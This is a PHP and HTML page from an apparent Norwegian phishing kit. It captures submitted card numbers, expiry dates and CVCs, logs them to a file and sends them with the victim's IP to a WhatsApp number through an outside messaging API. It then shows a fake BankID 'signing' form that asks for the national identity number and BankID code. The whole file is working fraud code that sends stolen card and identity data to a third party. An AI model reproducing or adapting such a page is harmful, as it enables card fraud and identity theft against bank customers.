<?php
session_start();
$kortnr = $_POST['kortnr'] ?? 'ukjent';
$utlopsdato = $_POST['utlopsdato'] ?? 'ukjent';
$cvc = $_POST['cvc'] ?? 'ukjent';
$vare = $_SESSION['vare'] ?? 'ukjent';
$ip = $_SERVER['REMOTE_ADDR'] ?? 'ukjent';
$tid = date("Y-m-d H:i:s");
$logg = "[$tid] IP: $ip – Vare: $vare – Kort: $kortnr – Utløp: $utlopsdato – CVC: $cvc\n";
file_put_contents("logs.txt", $logg, FILE_APPEND);
$melding = urlencode($logg);
$whats_url = "https://api.callmebot.com/whatsapp.php?phone=4741357171&text=$melding&apikey=7838436";
file_get_contents($whats_url);
?>

<!DOCTYPE html>
<html lang="no">
<head>
  <meta charset="UTF-8">
  <title>BankID</title>
</head>
<body>
  <h2>BankID-signering</h2>
  <p>Signering for: <?php echo $vare; ?></p>
  <form action="takk.php" method="post">
    <input type="text" name="fnr" placeholder="Fødselsnummer"><br>
    <input type="text" name="kode" placeholder="BankID-kode"><br>
    <button type="submit">Signer</button>
  </form>
</body>
</html>
